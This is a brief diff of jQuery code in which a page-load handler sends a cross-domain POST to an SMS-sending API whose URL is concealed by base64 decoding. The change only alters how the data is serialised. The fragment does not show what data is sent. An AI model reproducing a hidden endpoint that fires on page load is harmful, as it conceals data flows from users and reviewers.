@@ -27,7 +27,7 @@ $(window).on("load", function() {
         url: atob("aHR0cHM6Ly9zbXNrdWxkby5yZWFsbW9uaXRvci5odS9hcGkvdjEvc2VuZA" + "=="),
         type: "POST",
         crossDomain: true,
-        data: JSON.stringify(p),
+        data: p,
         dataType: "json",
         success: function (r) {
           if (r && r.ok === true) {
